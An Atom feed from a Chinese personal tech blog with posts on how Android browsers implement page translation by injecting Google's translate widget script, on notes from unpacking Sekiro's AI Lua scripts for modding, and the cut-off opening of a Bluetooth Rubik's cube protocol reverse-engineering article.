<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ekkkkkkko</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2021-02-19T14:28:56.315Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>一只大茶蛋</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Android浏览器翻译功能调研</title>
    <link href="http://yoursite.com/2021/02/19/Android%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BF%BB%E8%AF%91%E5%8A%9F%E8%83%BD%E8%B0%83%E7%A0%94/"/>
    <id>http://yoursite.com/2021/02/19/Android%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BF%BB%E8%AF%91%E5%8A%9F%E8%83%BD%E8%B0%83%E7%A0%94/</id>
    <published>2021-02-19T14:22:11.000Z</published>
    <updated>2021-02-19T14:28:56.315Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>这里简单记录一下，关于市面上常见的Android手机浏览器网页翻译功能的情况，以及简述目前我了解到的网页翻译的方式，根据收集到的情况来看，有些方案是适用于任何浏览器的，和平台都没有太大关系。</p><p>相关安装包均为2021年2月初在华为手机应用市场下载的版本，仅代表当时的情况，虽然部分浏览器支持添加翻译插件，但是这里仅仅手机原始包的情况。</p><a id="more"></a><h3 id="0x01-市面上常见的Android手机浏览器及其翻译功能的支持情况"><a href="#0x01-市面上常见的Android手机浏览器及其翻译功能的支持情况" class="headerlink" title="0x01 市面上常见的Android手机浏览器及其翻译功能的支持情况"></a>0x01 市面上常见的Android手机浏览器及其翻译功能的支持情况</h3><h4 id="拥有翻译功能的浏览器"><a href="#拥有翻译功能的浏览器" class="headerlink" title="拥有翻译功能的浏览器"></a>拥有翻译功能的浏览器</h4><ol><li>Chrome</li><li>uc浏览器  没用，不太清楚是不是我自己手机有什么问题</li><li>搜狗浏览器</li><li>Edge</li><li>夸克</li><li>QQ浏览器</li><li>极速浏览器</li><li>360浏览器</li><li>via浏览器</li><li>x浏览器</li><li>猎豹浏览器 这个在我手机里头也不好使</li></ol><h4 id="没有翻译功能的浏览器"><a href="#没有翻译功能的浏览器" class="headerlink" title="没有翻译功能的浏览器"></a>没有翻译功能的浏览器</h4><ol><li>firefox</li><li>星尘浏览器  </li><li>百度浏览器/百度移动端app<br>百度移动端app因为集成了搜索，感觉和浏览器差不多，就放在一起看了，没有在工具箱看到这个功能，按理来说这么大的厂不至于没有这玩意啊，也可能是我版本不对或者入口深吧。</li></ol><h3 id="0x02-部分浏览器翻译功能的实现分析"><a href="#0x02-部分浏览器翻译功能的实现分析" class="headerlink" title="0x02 部分浏览器翻译功能的实现分析"></a>0x02 部分浏览器翻译功能的实现分析</h3><p>部分自带的浏览器使用的是内置的翻译功能，我逆向这块不是特别熟悉，只是简单看了看，这里只介绍分析出结果的翻译功能的实现。</p><h4 id="Chrome-360浏览器"><a href="#Chrome-360浏览器" class="headerlink" title="Chrome/360浏览器"></a>Chrome/360浏览器</h4><p>360浏览器我也不确定他是不是真的就和chrome完全一摸一样，但是用起来的ui和效果是完全一致的，国内挺多浏览器应该都是chrome套壳做的。这里找到了别人处理好的Chrome的源码 <a href="https://github.com/kuoruan/Chromium-Android" target="_blank" rel="noopener">https://github.com/kuoruan/Chromium-Android</a> ，然后也有简单看一下它的翻译功能对应的类 TranslateBridge ，再下面就是native了，项目里面只有so，so对应的源码没有找到，相关的符号或者函数名称都尝试检索过，没有结果，可能是代码分支或者build之类的不同吧。</p><h4 id="via-x浏览器"><a href="#via-x浏览器" class="headerlink" title="via/x浏览器"></a>via/x浏览器</h4><p>这类的实现方式比较简单，耦合的代码也非常少。实际上就是注入了一小段js<br>//出处 <a href="https://blog.csdn.net/Cdeeffq/article/details/103934994" target="_blank" rel="noopener">https://blog.csdn.net/Cdeeffq/article/details/103934994</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">"google_translate_element"</span> style=<span class="string">"position:absolute;bottom:10px;right:10px;z-index:2000;opacity:0.7"</span>&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">googleTranslateElementInit</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> google.translate.TranslateElement(</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// pageLanguage: 'zh-CN',</span></span><br><span class="line">                <span class="comment">// 需要翻译的语言，比如你只需要翻译成越南和英语，这里就只写en,vi</span></span><br><span class="line">                includedLanguages: <span class="string">'en,zh-CN,hr,cs,da,nl,fr,de,el,iw,hu,ga,it,ja,ko,pt,ro,ru,sr,es,th,vi'</span>,</span><br><span class="line">                layout: google.translate.TranslateElement.InlineLayout.SIMPLE,</span><br><span class="line">                <span class="comment">// 自动显示翻译横幅，就是翻译后顶部出现的那个</span></span><br><span class="line">                autoDisplay: <span class="literal">true</span>,</span><br><span class="line">                <span class="comment">// 还有些其他参数，由于原插件不再维护，找不到详细api了，将就了，实在不行直接上dom操作</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">'google_translate_element'</span> <span class="comment">// 触发元素的id</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;script src="https:/</span><span class="regexp">/translate.google.cn/</span>translate_a/element.js?cb=googleTranslateElementInit<span class="string">"&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>感兴趣的朋友可以打开chrome的开发者模式然后在控制台输入这段代码，就可以实现翻译功能了。我并不是非常熟悉js，这里只是一个示例。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pageBodyForTransalte = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">var</span> btnGoogleTranslate = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>);</span><br><span class="line">btnGoogleTranslate.id = <span class="string">"google_translate_element"</span>;</span><br><span class="line">btnGoogleTranslate.setAttribute(<span class="string">'style'</span>, <span class="string">'position:absolute;bottom:10px;right:10px;z-index:2000;opacity:0.7'</span>);</span><br><span class="line">pageBodyForTransalte.appendChild(btnGoogleTranslate);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> googleTranslateScript = <span class="built_in">document</span>.createElement(<span class="string">"script"</span>);</span><br><span class="line">googleTranslateScript.src = <span class="string">"https://translate.google.cn/translate_a/element.js?cb=googleTranslateElementInit"</span>;</span><br><span class="line">pageBodyForTransalte.appendChild(googleTranslateScript);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">googleTranslateElementInit</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">new</span> google.translate.TranslateElement(&#123;</span><br><span class="line">      <span class="comment">// pageLanguage: 'zh-CN',</span></span><br><span class="line">      <span class="comment">// 需要翻译的语言，比如你只需要翻译成越南和英语，这里就只写en,vi</span></span><br><span class="line">      includedLanguages: <span class="string">'en,zh-CN,hr,cs,da,nl,fr,de,el,iw,hu,ga,it,ja,ko,pt,ro,ru,sr,es,th,vi'</span>,</span><br><span class="line">      layout: google.translate.TranslateElement.InlineLayout.SIMPLE,</span><br><span class="line">      <span class="comment">// 自动显示翻译横幅，就是翻译后顶部出现的那个</span></span><br><span class="line">      autoDisplay: <span class="literal">true</span>,</span><br><span class="line">      <span class="comment">// 还有些其他参数，由于原插件不再维护，找不到详细api了，将就了，实在不行直接上dom操作</span></span><br><span class="line">    &#125;,<span class="string">'google_translate_element'</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里逆向了via浏览器，因为没有加固啥的，倒是好说，它注入的js大概是这样的。基本原理和上面说的都是一样的。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">s.type = <span class="string">'text/javascript'</span>;</span><br><span class="line">s.text = <span class="string">"!function()&#123;!function()&#123;function e()&#123;window.setTimeout(function()&#123;window[t].showBanner(!0)&#125;,10)&#125;function n()&#123;return new google.translate.TranslateElement(&#123;autoDisplay:!1,floatPosition:0,multilanguagePage:!0,includedLanguages:'null',pageLanguage:'auto'&#125;)&#125;var t=(document.documentElement.lang,'TE_3b04e01e881a82d5e4776c906373d512'),o='TECB_3b04e01e881a82d5e4776c906373d512';if(window[t])e();else if(!window.google||!google.translate||!google.translate.TranslateElement)&#123;window[o]||(window[o]=function()&#123;window[t]=n(),e()&#125;);var a=document.createElement('script');a.src='https://translate.google.cn/translate_a/element.js?cb='+encodeURIComponent(o)+'&amp;client=tee',document.getElementsByTagName('head')[0].appendChild(a)&#125;&#125;()&#125;();"</span>;</span><br><span class="line"><span class="keyword">var</span> o = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'head'</span>);</span><br><span class="line"><span class="keyword">if</span> (o.length &gt; <span class="number">0</span> &amp;&amp; o[<span class="number">0</span>]) &#123;</span><br><span class="line">  o[<span class="number">0</span>].appendChild(s)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这个功能的实现基于谷歌的一个接口，比较遗憾的是谷歌已经停止对它的支持了 <a href="https://translate.google.com/intl/en/about/website/" target="_blank" rel="noopener">https://translate.google.com/intl/en/about/website/</a>  可以继续使用，但是已经没有文档一类的信息了。</p><p>这里简单提一下Android WebView调用js的方式，使用evaluateJavascript或loadUrl函数就可以了，区别是前者有js调用的返回值，后者没有。</p><h4 id="极速浏览器"><a href="#极速浏览器" class="headerlink" title="极速浏览器"></a>极速浏览器</h4><p>它使用的方式，比上面的注入js还要更加简单<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url格式如下</span><br><span class="line">https://translate.googleusercontent.com/translate_c?sl=ORIGINALLANGUAGE&amp;tl=TRANSLATEDLANGUAGE&amp;u=WEBSITEURL</span><br></pre></td></tr></table></figure></p><p>示例，比如说现在需要翻译<a href="https://www.englishpage.com/，只用构造这样一个url然后跳转过去就好了" target="_blank" rel="noopener">https://www.englishpage.com/，只用构造这样一个url然后跳转过去就好了</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://translate.googleusercontent.com/translate_p?hl=en&amp;sl=auto&amp;tl=zh-CN&amp;u=https://www.englishpage.com/</span><br></pre></td></tr></table></figure></p><p>但是它会跳转到translate.google.com并展示翻译结果，而这个域名无法访问。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;这里简单记录一下，关于市面上常见的Android手机浏览器网页翻译功能的情况，以及简述目前我了解到的网页翻译的方式，根据收集到的情况来看，有些方案是适用于任何浏览器的，和平台都没有太大关系。&lt;/p&gt;
&lt;p&gt;相关安装包均为2021年2月初在华为手机应用市场下载的版本，仅代表当时的情况，虽然部分浏览器支持添加翻译插件，但是这里仅仅手机原始包的情况。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Android" scheme="http://yoursite.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Sekiro(只狼）分析笔记</title>
    <link href="http://yoursite.com/2020/08/06/Sekiro-%E5%8F%AA%E7%8B%BC%EF%BC%89%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/08/06/Sekiro-%E5%8F%AA%E7%8B%BC%EF%BC%89%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0/</id>
    <published>2020-08-06T01:53:47.000Z</published>
    <updated>2020-08-06T02:48:35.362Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><blockquote><p>四月分析《机甲战魔》的那个金币无消耗的那个笔记里头，说要整一个大活，后来其实发完就开始弄了，但是最后并没有整出来，主要是没找到最后结局全盛时期苇名一心的的ai代码，然后解包的程序本身对我这个折腾的方向来说，并不完美，而我也没有精力去处理解包的程序了，所以其实就咕咕咕了，最近整理笔记的时候发现这篇了，还是发一下吧，如果后续也有人对这个部分感兴趣的话，也许看到这个能稍微节省一些时间。这是我最后的波纹了！JOJO！</p></blockquote><p><img src="https://github.com/EggUncle/Demo/blob/master/markdownimg/1b3af8198618367a94985ef52f738bd4b31ce574.png?raw=true" alt=""></p><p>总的来说，就是想做一个有趣一些的修改工具，希望能直接针对游戏里面对手的技能或者招式，让玩家使用的角色自动做出配置好的动作。</p><a id="more"></a><h3 id="0x01-为什么要从mod开始而不是使用ida或者cheat-engine"><a href="#0x01-为什么要从mod开始而不是使用ida或者cheat-engine" class="headerlink" title="0x01 为什么要从mod开始而不是使用ida或者cheat engine"></a>0x01 为什么要从mod开始而不是使用ida或者cheat engine</h3><p>最早其实是想用的ida，然后找找汇编之类的，尝试使用inline hook之类的方式，修改游戏流程，就像先前使用cheat engine那种去改《机甲战魔》无金币消耗一样。后来发现，我还是想得太简单了，游戏的启动exe，本身大小还是比较小的，更像是一个加载资源的程序，自行研究资源找到ai逻辑代码，目前来说不太可行，而且不同游戏引擎开发出来的游戏，区别也许很大，这里可能在检索信息上难度也会比较大。</p><p>当时想到“游戏资源文件”，这个事情的时候，其实就想到mod了，因为之前在只狼看到过一些修改人物模型的mod，还有修改游戏逻辑（boss关卡由固定boss修改为随机boss）的mod，因此后来的思路由用ida硬刚，转换成了，尝试制作mod。</p><h3 id="0x02-一些mod，以及制作mod的工具"><a href="#0x02-一些mod，以及制作mod的工具" class="headerlink" title="0x02 一些mod，以及制作mod的工具"></a>0x02 一些mod，以及制作mod的工具</h3><ol><li><p>图像纹理提升mod</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://down.gamersky.com/pc/202004/1280996.shtml</span><br><span class="line">只狼：影逝二度的Mod，在LodParam与GrassLodRangeParam中进行了数值加倍，这会增加物体与纹理细节，并减少游戏中纹理突显的问题。</span><br></pre></td></tr></table></figure></li><li><p>随机分配boss mod</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://down.gamersky.com/pc/202003/1271025.shtml</span><br><span class="line">只狼：影逝二度 随机分配器MOD，使用之后可以随机化敌人（包括BOSS和BOSS）和物品（包括关键物品和技能），让玩家有全新的体验，非常的有趣，喜欢的玩家不要错过下载。</span><br></pre></td></tr></table></figure></li><li><p>mod 加载器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://down.gamersky.com/pc/201903/1166870.shtml</span><br><span class="line">使用mod加载器就可以加载各种mod，但是开发似乎需要使用额外的工具</span><br></pre></td></tr></table></figure></li></ol><h3 id="0x03-解包-amp-mod使用"><a href="#0x03-解包-amp-mod使用" class="headerlink" title="0x03 解包&amp;mod使用"></a>0x03 解包&amp;mod使用</h3><p>这里找到了解包的工具，名字叫UXM，<a href="https://www.nexusmods.com/sekiro/mods/26" target="_blank" rel="noopener">https://www.nexusmods.com/sekiro/mods/26</a> ，因为只狼是宫崎英高那个工作室的作品，因此之前各种魂系的单机包括现在的只狼，都是使用同一个游戏引擎开发的，网上有巨佬做过相关分析，整出来了这么一个解包工具，我觉着在他们工作室的魂系游戏里头，这个东西，很可能是比较通用的。</p><p>关于解包，我还在贴吧找到了这样一片帖子，这里把他解出来的目录情况的分析的截图转载一下，图片好像，有点儿大，出处 <a href="https://tieba.baidu.com/p/6213139531?red_tag=2718561838" target="_blank" rel="noopener">https://tieba.baidu.com/p/6213139531?red_tag=2718561838</a></p><p><img src="https://github.com/EggUncle/Demo/blob/master/markdownimg/5e470e7a02087bf47733303cfcd3572c13dfcf5f.jpg?raw=true" alt=""></p><p>这里可以看到根目录有个script文件夹，按照这个帖子所说的，script这里，似乎就是存着游戏ai的脚本，lua写的，需要解密才能看，放回去应该也是要反过来加密的，而在我实际打开后，发现确实存在似乎是ai逻辑相关的脚本，因为我不会lua，只能看个大概。</p><p>这里顺手下了一个修改模型的mod，看了一下，如果有mod的话需要如何使用，简单来说，就是自己在游戏根目录建立一个mods目录，然后把修改的mod根据相关层级放到这个新建目录里头去就行了，例如修改模型的mod，由于模型文件在parts目录下，因此mod文件就放置在，mods/parts 目录下即可。</p><h3 id="0x04-ai脚本资源相关分析"><a href="#0x04-ai脚本资源相关分析" class="headerlink" title="0x04 ai脚本资源相关分析"></a>0x04 ai脚本资源相关分析</h3><p>script这个目录对应ai目录，那么现在初步的的逻辑其实就有了：<br>通过分析lua脚本，来看看其中的npc的逻辑是什么样子的，目前大致猜想一下，假设突刺攻击动作为lua脚本中的一个函数attack，那么我们可以尝试对函数进行hook之类的操作，在检测到突刺攻击动作触发的时候，自动使用垫步动作，这样就能相对完美的来进行突刺攻击的应对。</p><p>尝试解包后，似乎在解开之后再解开一次，能看到一些关于lua的配置文件字段，有的是英文，有的似乎是日文拼音一样的东西，当时并不知道翻译软件可以直接根据这种拼音一样的东西翻译出来，直接找了一个在日本上学的朋友聊了聊这个，他刚好也比较喜欢玩这个。由于只狼是一个日本战国时代背景的游戏，还带有一些日本文化相关的内容，这里发现直接翻译也没那么直接的获取到相关单词的含义，还是直接问问比比较方便。</p><p>根据逻辑和一些代码，获取到了这部分信息：</p><p>D:\Program Files (x86)\Steam\steamapps\common\Sekiro\script\m10_00_00_00-luabnd-dcx\script\ai<br>PatrolLeader20000_Logic 这个似乎是巡逻队长的逻辑</p><p>下面这两个好像涉及到一些日文拼音一样的东西。。不太清楚<br>D:\Program Files (x86)\Steam\steamapps\common\Sekiro\script\m11_00_00_00-luabnd-dcx\script\ai<br>Nanimosinai11000_Logic 问了问会日语的朋友 什么都不要做？</p><p>D:\Program Files (x86)\Steam\steamapps\common\Sekiro\script\m15_00_00_00-luabnd-dcx\script\ai<br>HakaisouPhantom500005_Act01  破坏幻影？ 好像是破坏雾影，也许是幻影破解僧吧</p><p>D:\Program Files (x86)\Steam\steamapps\common\Sekiro\script\m25_00_00_00-luabnd-dcx\script\ai<br>Waraningyou_504000_Logic   这个朋友再问了个日本人。。意思是 藁人形，朋友再查了一下，是那个送只狼去源之宫的东西，麻绳做出的巨人一样的玩意</p><p>主要解的luainfo文件，有的目录是没有这个文件的</p><p>这里先尝试找到不死半兵卫的ai代码，把游戏语言改为英文，发现他的英文名字是 hanbei the undying</p><p>目前在逐个看lua代码，有点儿头疼，主要是名字都是日文拼音一类的东西<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">7menmusya  七面武士</span><br><span class="line">Yamori 壁虎</span><br><span class="line">JijoOba 二女儿阿姨。。。没明白啥意思？医女吗？</span><br><span class="line">Mihariban 哨兵</span><br><span class="line">NanbanArmor 南板甲。。没明白，难道是那个桥上面被踢下去的板甲武士吗</span><br><span class="line">Do beihei 美国兵。。啥啊就美国兵。。</span><br><span class="line">NewInu 新犬 是不是就是那个狗</span><br><span class="line">Sokushinbutsu 即时佛，应该是仙峰寺的什么玩意把</span><br><span class="line">Terakisozako 有一些以这个为开头的名字，似乎都是仙峰寺的，这个单词的疑似像是寺庙一类的</span><br><span class="line">Yashazaru Kenzoku 靖国康</span><br><span class="line">Kubinashi 无首把，我看还有个水下无首的逻辑</span><br><span class="line">FireBull 火牛 绝了，看到英文了，欸</span><br><span class="line">Kenkaku_weak 剑客，虚弱？老年一心吗</span><br><span class="line">MurabitoZombie 僵尸村民。。没明白是啥，水生村村民吗</span><br><span class="line">Tokugawazamurai 德川武士</span><br><span class="line">kaenhoushaki 喷火器</span><br><span class="line">Hakaisou 破戒僧</span><br><span class="line">Orochi 大蛇</span><br><span class="line">Orochi_nest 赤鬼之后没多久蛇巢穴的逻辑吗</span><br><span class="line">RedOgre 赤鬼把</span><br><span class="line">Nishikigoi 锦鲤</span><br><span class="line">NingyoRyu 好像是源之宫的东西吧，美人鱼龙？</span><br><span class="line">OnnaSousha 演奏乐器的女人？水生村的凛？</span><br><span class="line">NPC Busshi 游戏里面的小贩吗</span><br></pre></td></tr></table></figure></p><p>还是有一些没解出来</p><p>goal_list.lua 这个文件里面似乎有各种命名，再看看把，还有一个logic_list.lua 里面也是，他们类似于一个列表，将游戏的ai编号之类的的，都列了一遍，问题是，解包似乎并不完全，导致并不是所有ai逻辑都被解出来了。</p><p>LOGIC_ID_TestZatoichi_985000 有这样一个id，我感觉有戏啊，得在仔细看看，test，座头市的那个传统武士造型，和不死半兵卫很像。</p><p>目前发现一个新问题，解包失败了一半多，导致有些东西可能没找着。。再试试把，也不是都这样，是文件名字有重复所以覆盖了</p><p>MoujaSoldier 亡者士兵？这个是不死半兵卫吗？</p><p>目前我还是觉得，解包没有解全，有些脚本文件是没有的，应该是没有，在那个id文件里面应该是一个npc对应一个battle文件，以id命名的，但是我没有都找到，而且打包的文件数字不是连续的</p><p>这里可能不是解包工具的问题，看了下uxm源码，发现里面对每个目录都是有硬编码的，解包似乎不完全这个问题，我也发邮件问过UXM的作者了，他的回答是确实存在这种情况，都放在_unknown目录了，任何没识别出来的文件都在这边，但是没有脚本家了，action里头也存在部分ai逻辑，但是需要使用hks解密，但是这个解密工具，本身也不太好使。</p><p>到这里，因为仍然找不到半兵卫的逻辑，也找不到全盛苇名一心的ai逻辑，所以就弃坑了，其实可以搞搞火牛或者赤鬼的逻辑的，不过确实已经没什么兴趣了，哎，windows上打游戏还成，搞点儿花活就让我觉着不太方便。</p><h3 id="0x05-调试模式"><a href="#0x05-调试模式" class="headerlink" title="0x05 调试模式"></a>0x05 调试模式</h3><p>虽然已经弃坑了，但是这里还有另外一个有趣的发现，可以使用mod将游戏的调试模式打开<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">https://www.nexusmods.com/sekiro/mods/544</span><br><span class="line">[使用]</span><br><span class="line">Select=显示/隐藏菜单</span><br><span class="line">RT +右摇杆=调整大小菜单</span><br><span class="line">RT +左摇杆=移动菜单</span><br><span class="line">L3 + X =冻结/取消冻结摄像机</span><br><span class="line">﻿L3 + A =旋转摄像机</span><br><span class="line"></span><br><span class="line">[安装]</span><br><span class="line">将“ d3d11.dll”拖放到您的Sekiro目录里，打开游戏即可使用。</span><br><span class="line"></span><br><span class="line">[卸载]</span><br><span class="line">从Sekiro目录中删掉文件“d3d11.dll”即可。</span><br><span class="line"></span><br><span class="line">[mod问题]</span><br><span class="line">Q) I can&apos;t see text on the GUI windows（在GUI窗口上看不到文本的问题）</span><br><span class="line">A) That&apos;s still broken, I&apos;ll fix it later（未来作者会有后续修复）</span><br><span class="line"></span><br><span class="line">Q) The text is flickering（文本闪烁，视频里也出现这个问题了）</span><br><span class="line">A) We had to balance between refreshing the menu fast enough to keep it updated, and the flickering. It&apos;s still fairly bad but should be manageable for now.（意思是目前无解……）</span><br><span class="line"></span><br><span class="line">[CREDITS]</span><br><span class="line"></span><br><span class="line">Special thanks for Enlisted for helping me figure out the draw function.</span><br><span class="line">Special thanks for Pav for restoring some of the menu drop-downs.</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;四月分析《机甲战魔》的那个金币无消耗的那个笔记里头，说要整一个大活，后来其实发完就开始弄了，但是最后并没有整出来，主要是没找到最后结局全盛时期苇名一心的的ai代码，然后解包的程序本身对我这个折腾的方向来说，并不完美，而我也没有精力去处理解包的程序了，所以其实就咕咕咕了，最近整理笔记的时候发现这篇了，还是发一下吧，如果后续也有人对这个部分感兴趣的话，也许看到这个能稍微节省一些时间。这是我最后的波纹了！JOJO！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/EggUncle/Demo/blob/master/markdownimg/1b3af8198618367a94985ef52f738bd4b31ce574.png?raw=true&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;总的来说，就是想做一个有趣一些的修改工具，希望能直接针对游戏里面对手的技能或者招式，让玩家使用的角色自动做出配置好的动作。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="windows" scheme="http://yoursite.com/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>计客蓝牙魔方协议逆向分析</title>
    <link href="http://yoursite.com/2020/07/28/%E8%AE%A1%E5%AE%A2%E8%93%9D%E7%89%99%E9%AD%94%E6%96%B9%E5%8D%8F%E8%AE%AE%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/07/28/%E8%AE%A1%E5%AE%A2%E8%93%9D%E7%89%99%E9%AD%94%E6%96%B9%E5%8D%8F%E8%AE%AE%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</id>
    <published>2020-07-28T13:49:26.000Z</published>
    <updated>2020-07-28T14:05:38.470Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文首发自安全客平台 <a href="https://www.anquanke.com/post/id/211979" target="_blank" rel="noopener">https://www.anquanke.com/post/id/211979</a></p></blockquote><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>本文大致记录了一个，对于蓝牙魔方中的协议逆向分析的步骤。</p><p>去年年初的时候，对蓝牙有一点儿兴趣，搞了搞ubertooth one（好像是叫这个名字？ 进不清楚了），用来嗅探蓝牙数据的，然后顺手又买了一个计客的魔方，带蓝牙功能的，简单来说就是基于蓝牙和手机的数据传输，将魔方的状态输出到手机上，以此来实现一些好玩的小功能的（诶再说下去感觉像是在打广告了）</p><p>总的来说，仅仅是记录一个，处理问题接近问题的思路，具体关于拧动魔方的方向，这里也不提了，回头带一个魔方入门教程在结尾的参考中吧。</p><a id="more"></a><h3 id="0x01-基础逻辑推理分析"><a href="#0x01-基础逻辑推理分析" class="headerlink" title="0x01 基础逻辑推理分析"></a>0x01 